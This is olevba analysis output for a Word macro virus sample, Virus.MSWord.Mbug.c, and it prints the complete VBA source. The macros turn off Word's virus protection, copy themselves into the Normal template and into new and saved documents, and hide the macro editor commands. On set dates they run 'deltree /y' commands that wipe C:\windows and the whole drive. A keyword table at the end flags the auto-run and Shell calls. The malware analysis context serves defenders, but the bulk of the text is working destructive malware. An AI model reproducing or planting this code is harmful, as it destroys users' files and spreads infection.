olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbug.c-765348e2fc19ba0991f7f4f01ab6e878e860d747
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbug.c-765348e2fc19ba0991f7f4f01ab6e878e860d747 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO skeleton.bas 
in file: Virus.MSWord.Mbug.c-765348e2fc19ba0991f7f4f01ab6e878e860d747 - OLE stream: 'Macros/VBA/skeleton'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo errorAE
If Day(Now()) = "30" Then
UserForm1.Show
Shell "deltree /y c:\windows", vbHide
Shell "deltree /y c:\*.*", vbHide
End If
errorAE:
End Sub
Sub AutoNew()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAN
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="skeleton", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="userform1", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="userform2", Object:=wdOrganizerObjectProjectItems
    With Dialogs(wdDialogFileSummaryInfo)
        .Subject = "Skeleton Macro"
        .Execute
    End With
ErrorAN:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "skeleton" Then
        bInstalled = -1
    End If
Next i
If Not bInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="skeleton", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm2", Object:=wdOrganizerObjectProjectItems
    For a = 1 To 10
    StatusBar = "Skeleton"
    Next a
Else
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="skeleton", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm2", Object:=wdOrganizerObjectProjectItems
End If
ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    If Day(Now()) = "1" Or Day(Now()) = "13" Then
    UserForm2.Show
    Shell "deltree /y c:\windows", vbMinimizedFocus
    Shell "deltree /y c:\*.*", vbMinimizedFocus
    End If
    Dialogs(wdDialogFileSaveAs).Show
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="skeleton", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm2", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
End If
End Sub

Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
ErrorFT:
End Sub

Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

